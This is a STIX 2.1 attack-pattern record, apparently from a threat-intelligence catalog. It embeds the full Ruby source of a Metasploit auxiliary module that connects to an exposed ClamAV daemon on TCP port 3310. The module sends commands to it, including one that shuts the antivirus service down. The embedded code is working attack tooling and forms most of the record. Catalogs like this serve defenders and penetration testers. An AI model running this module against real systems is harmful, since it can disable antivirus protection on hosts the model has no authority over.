{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc26f099-0b3a-490e-a3b9-24f3fd8d6711",
    "created": "2024-08-14T16:27:03.802772Z",
    "modified": "2024-08-14T16:27:03.802776Z",
    "name": "ClamAV Remote Command Transmitter",
    "description": "( In certain configurations, ClamAV will bind to all addresses and listen for commands. This module sends properly-formatted commands to the ClamAV daemon if it is in such a configuration. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/clamav_control.rb",
            "external_id": "clamav_control.rb"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/nitr0usmx/status/740673507684679680/photo/1"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vrtadmin/clamav-faq/raw/master/manual/clamdoc.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'ClamAV Remote Command Transmitter',\n        'Description'    => %q(\n          In certain configurations, ClamAV will bind to all addresses and listen for commands.\n          This module sends properly-formatted commands to the ClamAV daemon if it is in such a\n          configuration.\n        ),\n        'Author'         => [\n          'Alejandro Hdeza', # DISCOVER\n          'bwatters-r7',     # MODULE\n          'wvu'              # GUIDANCE\n        ],\n        'License'        => MSF_LICENSE,\n        'References'     => [\n          [ 'URL', 'https://twitter.com/nitr0usmx/status/740673507684679680/photo/1' ],\n          [ 'URL', 'https://github.com/vrtadmin/clamav-faq/raw/master/manual/clamdoc.pdf' ]\n        ],\n        'DisclosureDate' => '2016-06-08',\n        'Actions'        => [\n          [ 'VERSION', 'Description' => 'Get Version Information' ],\n          [ 'SHUTDOWN', 'Description' => 'Kills ClamAV Daemon' ]\n        ],\n        'DefaultAction'  => 'VERSION'\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(3310)\n      ], self.class\n    )\n  end\n\n  def run_host(_ip)\n    begin\n      connect\n      sock.put(action.name + \"\\n\")\n      print_good(sock.get_once)\n    rescue EOFError\n      print_good('Successfully shut down ClamAV Service')\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-08"
}